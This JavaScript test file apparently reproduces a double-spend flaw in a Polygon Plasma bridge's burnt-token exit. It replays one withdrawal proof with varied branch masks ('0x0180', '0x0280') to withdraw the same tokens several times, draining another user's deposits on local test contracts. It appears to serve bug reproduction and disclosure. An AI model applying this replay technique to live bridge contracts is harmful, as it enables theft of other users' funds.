import chai from 'chai'
import chaiAsPromised from 'chai-as-promised'
import ethUtils from 'ethereumjs-util'

import deployer from '../../../helpers/deployer.js'
import logDecoder from '../../../helpers/log-decoder.js'
import { buildInFlight } from '../../../mockResponses/utils'
import StatefulUtils from '../../../helpers/StatefulUtils'
const predicateTestUtils = require('./predicateTestUtils')

const utils = require('../../../helpers/utils')
const web3Child = utils.web3Child
const rlp = ethUtils.rlp

chai.use(chaiAsPromised).should()
let contracts, childContracts, statefulUtils

// Copying this function definition here because we will need to customize is to reproduce the attack
function buildReferenceTxPayload(input, branchMask) {
  const {
    headerNumber,
    blockProof,
    blockNumber,
    blockTimestamp,
    reference,
    logIndex
  } = input
  return [
    headerNumber,
    ethUtils.bufferToHex(Buffer.concat(blockProof)),
    blockNumber,
    blockTimestamp,
    ethUtils.bufferToHex(reference.transactionsRoot),
    ethUtils.bufferToHex(reference.receiptsRoot),
    ethUtils.bufferToHex(reference.receipt),
    ethUtils.bufferToHex(rlp.encode(reference.receiptParentNodes)),
    branchMask,
    logIndex
  ]
}

// Start an exit of burnt tokens from Polygon to Ethereum
// This will be called many times for the exploit
async function startAndProcessExit(branchMask, predicateInput, contracts, childContracts, user, amount) {
    const payload = ethUtils.bufferToHex(rlp.encode(buildReferenceTxPayload(predicateInput, branchMask)))
    const startExitTx = await contracts.ERC20Predicate.startExitWithBurntTokens(payload, {from: user})
    console.log("After exit transaction root tokens: " + await childContracts.rootERC20.balanceOf(user))
    console.log("After exit transaction child tokens: " + await childContracts.childToken.balanceOf(user))
    const logs = logDecoder.decodeLogs(startExitTx.receipt.rawLogs)
    const log = logs[utils.filterEvent(logs, 'ExitStarted')]
    expect(log.args).to.include({
      exitor: user,
      token: childContracts.rootERC20.address,
      isRegularExit: true
    })
    utils.assertBigNumberEquality(log.args.amount, amount)

    const processExits = await predicateTestUtils.processExits(contracts.withdrawManager, childContracts.rootERC20.address)
    console.log("After process exit root tokens: " + await childContracts.rootERC20.balanceOf(user))
    console.log("After process exit child tokens: " + await childContracts.childToken.balanceOf(user))
    processExits.logs.forEach(log => {
      log.event.should.equal('Withdraw')
      expect(log.args).to.include({ token: childContracts.rootERC20.address })
    })
}

async function depositTokensToPolygon(contracts, childContracts, user, amount) {
  await childContracts.rootERC20.approve(contracts.depositManager.address, amount, {from: user})
  const result = await contracts.depositManager.depositERC20ForUser(childContracts.rootERC20.address, user, amount, {from: user})
  const logs = logDecoder.decodeLogs(result.receipt.rawLogs)
  const NewDepositBlockEvent = logs.find(
    log => log.event === 'NewDepositBlock'
  )
  const depositBlockId = NewDepositBlockEvent.args.depositBlockId
  const deposit = await childContracts.childChain.onStateReceive('0xa' /* dummy id */,
    utils.encodeDepositStateSync(
      user,
      childContracts.rootERC20.address,
      amount,
      depositBlockId
    )
  )
}


// This test sends an ERC20 token from an owner contract on Ethereum (root) chain to a non-owner user,
// deposits the tokens into the Polygon (child) chain,
// withdraws the tokens from the child chain back to the root chain,
// processes the withdrawal on the root chain,
// and then executes the multiple withdrawal attack.
contract('ReproduceDoubleSpendBug', async function(accounts) {
  const amount = web3.utils.toBN('10').mul(utils.scalingFactor)
  // The maximum ERC20 deposit size is 50
  const bigAmount = web3.utils.toBN('50').mul(utils.scalingFactor)
  const owner = accounts[0]
  const user = accounts[1]
  const user2 = accounts[2]


  before(async function() {
    contracts = await deployer.freshDeploy(owner)
    childContracts = await deployer.initializeChildChain(owner)
    statefulUtils = new StatefulUtils()
  })

  describe('reproduceDoubleSpendBug', async function() {
    beforeEach(async function() {
      contracts.withdrawManager = await deployer.deployWithdrawManager()
      contracts.ERC20Predicate = await deployer.deployErc20Predicate(true)
    })

    it('Exit with burnt tokens', async function() {
      const { rootERC20, childToken } = await deployer.deployChildErc20(owner)
      childContracts.rootERC20 = rootERC20
      childContracts.childToken = childToken

      console.log("Deposit amount: " + amount)
      utils.assertBigNumberEquality(await rootERC20.balanceOf(user), 0)
      utils.assertBigNumberEquality(await childToken.balanceOf(user), 0)

      console.log("Before transfer root tokens: " + await rootERC20.balanceOf(user))
      console.log("Before transfer child tokens: " + await childToken.balanceOf(user))
      rootERC20.transfer(user, amount, {from: owner})
      utils.assertBigNumberEquality(await rootERC20.balanceOf(user), amount)
      utils.assertBigNumberEquality(await childToken.balanceOf(user), 0)

      // user2 puts in tokens - user will be able to maliciously steal these tokens
      rootERC20.transfer(user2, bigAmount, {from: owner})
      utils.assertBigNumberEquality(await rootERC20.balanceOf(user2), bigAmount)

      console.log("Before deposit root tokens: " + await rootERC20.balanceOf(user))
      console.log("Before deposit child tokens: " + await childToken.balanceOf(user))

      await depositTokensToPolygon(contracts, childContracts, user, amount)
      utils.assertBigNumberEquality(await rootERC20.balanceOf(user), 0)
      utils.assertBigNumberEquality(await childToken.balanceOf(user), amount)
      console.log("After deposit root tokens: " + await rootERC20.balanceOf(user))
      console.log("After deposit child tokens: " + await childToken.balanceOf(user))
      // assert deposit on child chain
      utils.assertBigNumberEquality(await childContracts.childToken.balanceOf(user), amount)
      utils.assertBigNumberEquality(await rootERC20.balanceOf(contracts.depositManager.address), amount)

      // User 2 deposits all of their tokens onto Polygon
      await depositTokensToPolygon(contracts, childContracts, user2, bigAmount)
      utils.assertBigNumberEquality(await childContracts.childToken.balanceOf(user2), bigAmount)
      utils.assertBigNumberEquality(await rootERC20.balanceOf(contracts.depositManager.address), amount.add(bigAmount))

      // begin withdrawal
      const { receipt } = await childContracts.childToken.withdraw(amount, {from: user})
      console.log("After withdraw root tokens: " + await rootERC20.balanceOf(user))
      console.log("After withdraw child tokens: " + await childToken.balanceOf(user))
      let { block, blockProof, headerNumber, reference } = await statefulUtils.submitCheckpoint(contracts.rootChain, receipt, accounts)
      const predicateInput =
            { headerNumber, blockProof, blockNumber: block.number, blockTimestamp: block.timestamp, reference, logIndex: 1 }

      // First exit
      // 0x0080 is the default that was being used in the test originally
      let branchMask = "0x0080"
      console.log("Branch mask:" + branchMask)
      await startAndProcessExit(branchMask, predicateInput, contracts, childContracts, user, amount)
      utils.assertBigNumberEquality(await rootERC20.balanceOf(user), amount)
      utils.assertBigNumberEquality(await childToken.balanceOf(user), 0)
      utils.assertBigNumberEquality(await rootERC20.balanceOf(contracts.depositManager.address), bigAmount)

      // Call startExitWithBurntTokens again with special inputs to cause the bug:
      branchMask = "0x0180"
      console.log("Branch mask:" + branchMask)
      await startAndProcessExit(branchMask, predicateInput, contracts, childContracts, user, amount)
      utils.assertBigNumberEquality(await rootERC20.balanceOf(user), amount * 2)
      utils.assertBigNumberEquality(await childToken.balanceOf(user), 0)
      utils.assertBigNumberEquality(await rootERC20.balanceOf(contracts.depositManager.address), bigAmount.sub(amount))

      branchMask = "0x0280"
      console.log("Branch mask:" + branchMask)
      await startAndProcessExit(branchMask, predicateInput, contracts, childContracts, user, amount)
      utils.assertBigNumberEquality(await rootERC20.balanceOf(user), amount * 3)
      utils.assertBigNumberEquality(await childToken.balanceOf(user), 0)
      utils.assertBigNumberEquality(await rootERC20.balanceOf(contracts.depositManager.address),
                                    bigAmount.sub(web3.utils.toBN(amount * 2)))

      // User has now withdrawn their tokens two times more than they should be allowed to.
      // This could be done 221 more times with further variations on the branch mask

      // The below test will fail because of the above hack
      //try {
        //await utils.startExitWithBurntTokens(
          //contracts.ERC20Predicate,
          //{ headerNumber, blockProof, blockNumber: block.number, blockTimestamp: block.timestamp, reference, logIndex: 1 },
          //user
        //)
        //assert.fail('was able to start an exit again with the same tx')
      //} catch(e) {
        //assert(e.message.search('KNOWN_EXIT') >= 0)
      //}
    })
  })
})
